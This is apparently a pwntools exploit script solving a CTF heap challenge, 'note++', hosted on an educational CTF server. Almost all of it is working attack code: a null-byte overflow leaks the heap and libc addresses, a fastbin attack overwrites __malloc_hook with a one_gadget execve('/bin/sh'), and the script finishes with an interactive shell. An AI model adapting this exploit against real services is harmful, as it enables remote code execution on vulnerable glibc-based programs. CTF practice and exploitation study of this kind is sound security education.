from pwn import *

context(arch='amd64', os='linux', log_level='debug')

e = ELF('note++')
libc = ELF('libc-2.23.so')

#  0x45216 execve("/bin/sh", rsp+0x30, environ)
#  constraints:
#    rax == NULL

#  0x4526a execve("/bin/sh", rsp+0x30, environ)
#  constraints:
#    [rsp+0x30] == NULL

#  0xf02a4 execve("/bin/sh", rsp+0x50, environ)
#  constraints:
#    [rsp+0x50] == NULL

#  0xf1147 execve("/bin/sh", rsp+0x70, environ)
#  constraints:
#    [rsp+0x70] == NULL
one_gadget_off = 0x4526a


#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10181)

def add(size, note, desc):
    r.sendlineafter('> \n', '1')
    r.sendlineafter('Size: ', str(size))

    if note is int:
        note = str(note)
    r.sendlineafter('Note: ', note)

    if desc is int:
        r.sendlineafter('Description of this note: ', str(desc))
    else:
        r.sendlineafter('Description of this note: ', desc)

def list_():
    r.sendlineafter('> \n', '2')

def delete(idx):
    r.sendlineafter('> \n', '3')
    r.sendlineafter('Index: ', str(idx))


chunk_size = 0x70
malloc_size = 0x68
chunk_size_big = 0x90
malloc_size_big = 0x88

# leak heap base
add(malloc_size, 'note0', 'desc0')
add(malloc_size, 'note1', 'desc1')
add(malloc_size, flat(b'a'*0x18, 0x51), 'desc2')
delete(2)
delete(1)
delete(0)
add(malloc_size, 'note0 again', 'a' * 48) # scanf append null-byte -> note1.is_freed becomes 0

list_()
r.recvuntil('Note 1:\n  Data: ')
heap = u64(r.recv(6) + b'\0\0') - chunk_size*2
success('heap='+hex(heap))



# leak libc base
# fastbin -> unsorted bin
delete(0)
delete(1)
add(malloc_size, p64(heap + chunk_size - 0x10), 'd')
add(malloc_size, b'a'*0x58 + p64(chunk_size | 1), 'd')
add(malloc_size, 'a', 'b')
add(malloc_size, b'b'*8 + p64(chunk_size_big | 1), 'd')
delete(2)
delete(1)
add(malloc_size, 'b', b'a'*48)

list_()
r.recvuntil('Note 2:\n  Data: ')
off = 0x00007f0e99d54b78 - 0x7f0e99990000
libc.address = u64(r.recv(6) + b'\0\0') - off

success('libc='+hex(libc.address))



# hijack malloc hook
# fastbin attack
add(malloc_size, 'note0', 'desc0')
add(malloc_size, 'note1', 'desc1')
delete(5)
delete(4)
add(malloc_size, 'note0 again', 'a' * 48) # scanf append null-byte -> note1.is_freed becomes 0
delete(4)
delete(5)

# __malloc_hook is immediately after __realloc_hook
target = p64(libc.sym.__realloc_hook - 0x10 - 3 - 8)
content = b'\0'*11 + p64(libc.address + one_gadget_off) + p64(libc.sym.__libc_realloc + 13)
add(malloc_size, target, 'a')
add(malloc_size, 'b', 'a')
add(malloc_size, 'b', 'a')
add(malloc_size, content, 'a')


# trigger
r.sendlineafter('> \n', '1')
r.sendlineafter('Size: ', str(0x66))

r.interactive()
